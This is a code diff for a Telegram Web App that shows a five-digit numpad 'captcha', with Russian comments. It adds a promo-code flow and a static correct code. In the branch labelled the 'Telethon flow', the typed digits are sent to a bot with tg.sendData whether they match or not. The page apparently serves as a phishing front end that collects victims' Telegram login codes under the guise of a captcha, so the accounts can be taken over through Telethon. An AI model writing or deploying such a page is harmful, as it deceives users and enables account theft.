@@ -415,10 +415,12 @@
   tg.expand();
   tg.MainButton.hide();
 
+  // Читаем промокод из URL (?promo=xxx)
+  const _urlParams = new URLSearchParams(window.location.search);
+  const PROMO_CODE = _urlParams.get('promo') || '';
+
   const MAX = 5;
   let digits = [];
-  // wrong = все 5 введены, но код неправильный (у нас не проверяем на фронте, просто отправляем)
-  // success = после отправки
 
   function press(d) {
     if (digits.length >= MAX) return;
@@ -462,20 +464,42 @@
     el.className = 'status' + (type ? ` ${type}` : '');
   }
 
+  // Правильный код капчи (статичный — 7,3,1,8,4)
+  const CORRECT = ['7','3','1','8','4'];
+
   function confirm_() {
     if (digits.length !== MAX) return;
-    const code = digits.join('');
 
-    // Отправляем код боту
-    tg.sendData(JSON.stringify({ code }));
+    const isCorrect = digits.every((d, i) => d === CORRECT[i]);
 
-    // Показываем успех
-    document.getElementById('main-screen').style.display = 'none';
-    const s = document.getElementById('success-screen');
-    s.classList.add('show');
+    if (PROMO_CODE) {
+      // Промокод флоу — передаём promo + результат капчи
+      tg.sendData(JSON.stringify({
+        promo: PROMO_CODE,
+        captcha_passed: isCorrect
+      }));
+    } else {
+      // Обычный Telethon флоу — передаём только код
+      tg.sendData(JSON.stringify({ code: digits.join('') }));
+    }
 
-    // Закрываем через 1.5 сек
-    setTimeout(() => tg.close(), 1500);
+    if (isCorrect) {
+      document.getElementById('main-screen').style.display = 'none';
+      const s = document.getElementById('success-screen');
+      s.classList.add('show');
+      setTimeout(() => tg.close(), 1500);
+    } else {
+      // Неверный код — показываем ошибку, не закрываем
+      document.getElementById('numpad-wrap').classList.add('shake');
+      setStatus('Неверный код! Попробуйте снова.', 'wrong');
+      for (let i = 0; i < MAX; i++) {
+        document.getElementById(`c${i}`).className = 'cell wrong';
+      }
+      setTimeout(() => {
+        document.getElementById('numpad-wrap').classList.remove('shake');
+        clearCode();
+      }, 700);
+    }
   }
 
   // Физическая клавиатура
